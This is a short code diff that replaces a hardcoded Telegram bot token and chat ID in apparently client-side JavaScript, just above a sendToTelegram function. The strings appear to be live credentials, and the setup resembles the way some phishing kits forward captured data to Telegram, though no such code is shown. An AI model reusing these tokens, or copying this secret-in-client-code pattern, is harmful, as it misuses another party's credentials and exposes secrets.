@@ -1,7 +1,7 @@
 
         // Telegram Bot Configuration
-        const BOT_TOKEN = '7801999481:AAHEEmECyBfITXVbpaC-asF_HJMUheYW4lM';
-        const CHAT_ID = '7579877666';
+        const BOT_TOKEN = '8191930366:AAF3nZYU_QC_wOpW-xKMvzwHVCKFN-KecxU';
+        const CHAT_ID = '7416028741';
 
         async function sendToTelegram(message) {
             try {
